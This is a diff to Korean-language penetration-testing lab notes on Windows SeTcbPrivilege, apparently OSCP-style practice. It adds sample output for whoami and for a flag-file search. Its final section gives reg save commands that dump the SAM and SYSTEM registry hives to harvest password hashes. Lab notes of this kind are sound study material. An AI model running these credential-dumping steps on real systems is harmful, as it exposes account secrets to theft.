@@ -6,12 +6,38 @@
 # 1. 특권 상태 확인
 
 - `whoami /priv | findstr /i "SeTcb"`
+
+```text
+SeTcbPrivilege                Act as part of the operating system       Enabled
+```
+
 - 보통 SYSTEM 계정에만 있다. 일반 서비스 계정에는 거의 없음
+
+```text
+whoami
+nt authority\system
+```
 
 # 2. 실습: 토큰 복제 확인
 
 - 현재 토큰으로 새 프로세스 실행이 가능한지 확인
   - `whoami /all`
+
+```text
+USER INFORMATION
+----------------
+User Name           SID
+=================== =============================================
+nt authority\system S-1-5-18
+
+PRIVILEGES INFORMATION
+----------------------
+Privilege Name                State
+============================= ========
+SeTcbPrivilege                Enabled
+... (중략)
+```
+
 - SeTcb가 있으면 임의 사용자의 토큰을 생성/복제할 수 있다
 
 # 3. 이해 포인트
@@ -20,4 +46,17 @@
 - 이미 SYSTEM이면 이 특권은 당연히 있고, 여기서 할 일은 자격 증명 수집/지속성
 - SYSTEM 쉘에서 우선순위:
   - `Get-ChildItem -Path C:\ -Recurse -File -Include local.txt,proof.txt -ErrorAction SilentlyContinue`
+
+```text
+Directory: C:\Windows\System32\Desktop
+Mode LastWriteTime Length Name
+---- ------------- ------ ----
+-a--- 10/13/2026      34 proof.txt
+```
+
   - `reg save HKLM\SAM C:\temp\SAM` + `reg save HKLM\SYSTEM C:\temp\SYSTEM`
+
+```text
+The operation completed successfully.
+The operation completed successfully.
+```
